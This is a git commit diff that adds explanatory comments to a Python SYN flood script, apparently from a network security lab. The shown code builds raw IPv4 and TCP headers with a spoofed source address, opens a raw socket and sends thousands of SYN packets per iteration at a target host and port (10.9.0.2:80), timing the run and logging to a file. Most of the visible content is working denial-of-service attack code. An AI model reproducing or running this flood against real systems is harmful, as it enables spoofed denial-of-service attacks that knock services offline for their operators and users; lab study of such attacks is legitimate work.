96e3c1754ac1f692047503fe70e4125c91cc50ef
uriel <uriel1999@gmail.com>
2024-09-10 00:29:57 +0300

    Added comments

--- Python/volumes/syn_flood.py
+++ Python/volumes/syn_flood.py
@@ -15,23 +15,23 @@ def checksum(msg):
 
 
 def create_ip_header(src_ip, dst_ip):
-    ip_ihl = 5
-    ip_ver = 4
-    ip_tos = 0
+    ip_ihl = 5  # Internet Header Length
+    ip_ver = 4  # IPv4
+    ip_tos = 0  # Type of Service
     ip_tot_len = 20 + 20  # IP header + TCP header
-    ip_id = random.randint(1, 65535)
-    ip_frag_off = 0
-    ip_ttl = 255
-    ip_proto = socket.IPPROTO_TCP
-    ip_check = 0
-    ip_saddr = socket.inet_aton(src_ip)
-    ip_daddr = socket.inet_aton(dst_ip)
+    ip_id = random.randint(1, 65535)    # Random IP ID
+    ip_frag_off = 0       # Fragment Offset
+    ip_ttl = 255          # Time to Live
+    ip_proto = socket.IPPROTO_TCP   # Protocol
+    ip_check = 0          # Checksum
+    ip_saddr = socket.inet_aton(src_ip) # Source IP (which we spoof)
+    ip_daddr = socket.inet_aton(dst_ip) # Destination IP
 
-    ip_ihl_ver = (ip_ver << 4) + ip_ihl
+    ip_ihl_ver = (ip_ver << 4) + ip_ihl 
 
     ip_header = struct.pack('!BBHHHBBH4s4s',
                             ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
-                            ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
+                            ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr) # Construct the IP header
 
     return ip_header
 
@@ -39,17 +39,17 @@ def create_ip_header(src_ip, dst_ip):
 def create_tcp_header(src_port, dst_port):
     tcp_source = src_port
     tcp_dest = dst_port
-    tcp_seq = 0
-    tcp_ack_seq = 0
-    tcp_doff = 5
+    tcp_seq = 0     # sequence number (not used here)
+    tcp_ack_seq = 0 # acknowledgement number (not used here)
+    tcp_doff = 5    # data offset
     tcp_fin = 0
-    tcp_syn = 1
+    tcp_syn = 1     # SYN flag is set to True
     tcp_rst = 0
     tcp_psh = 0
     tcp_ack = 0
     tcp_urg = 0
-    tcp_window = socket.htons(5840)
-    tcp_check = 0
+    tcp_window = socket.htons(5840) # maximum allowed window size
+    tcp_check = 0                   # checksum
     tcp_urg_ptr = 0
 
     tcp_offset_res = (tcp_doff << 4) + 0
@@ -61,7 +61,10 @@ def create_tcp_header(src_port, dst_port):
 
     return tcp_header
 
-
+'''
+    Function to send a SYN flood attack to a target IP and port
+    iterations: number of packets to send (used for logging)
+'''
 def syn_flood(target_ip, target_port, num_packets, iterations):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
@@ -99,7 +102,7 @@ def syn_flood(target_ip, target_port, num_packets, iterations):
 
 
 if __name__ == "__main__":
-    print("Starting SYN flood attack...")
+    print("Starting SYN flood attack...") 
     TARGET_IP = "10.9.0.2"
     TARGET_PORT = 80
     NUM_PACKETS = 10000
@@ -107,17 +110,17 @@ if __name__ == "__main__":
     iterations = 0
 
     try:
-        with open("syns_results_p.txt", "w") as log_file:
+        with open("syns_results_p.txt", "w") as log_file:   # Clear the log file
             log_file.write(f"start time: {time.ctime()}\n")
     except IOError as e:
         print(f"Error opening file: {e}")
 
     start_time = time.time()
 
-    for i in range(NUM_ITERATIONS):
-        # print(f"Sending SYN num: {iterations}")
+    for i in range(NUM_ITERATIONS): 
+        # print(f"Sending SYN num: {iterations}")   # Uncomment to see progress
         syn_flood(TARGET_IP, TARGET_PORT, NUM_PACKETS, iterations)
-        iterations += NUM_PACKETS
+        # iterations += NUM_PACKETS     # Not used on production code
 
     end_time = time.time()
     total_time = end_time - start_time
